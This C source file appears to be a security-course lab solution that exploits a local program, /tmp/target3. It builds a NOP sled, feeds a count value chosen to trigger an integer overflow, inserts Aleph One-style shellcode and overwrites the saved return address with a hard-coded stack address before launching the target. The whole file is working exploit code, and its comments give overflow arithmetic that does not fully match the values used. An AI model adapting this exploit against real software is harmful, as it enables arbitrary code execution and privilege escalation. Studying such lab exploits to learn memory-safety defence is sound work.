#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[241*20];

  //Steps
  //1. add noop sled to so that eip falls into noop for safe landing
  memset(buf, NOOP, 241*20);

  //2.  pick count = 2147483889 which when assigned to signed integer will overflow and make it -2147483407
  //2.1 when 2147483407 * 20  will again overflow the integer and result in 4280 which is good enough to overwrite EIP
  strncpy(buf, "2147483880,", 11);

  //3. add shellcode from alephone
  strncpy(buf + (235*20), shellcode, 45);

  //4. new EIP pointing to our landing address somewhere in buffer. 
  strncpy(buf + (240*20) + 15, "\x20", 1);
  strncpy(buf + (240*20) + 16, "\xdc", 1);
  strncpy(buf + (240*20) + 17, "\xff", 1);
  strncpy(buf + (240*20) + 18, "\xbf", 1);
  
  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
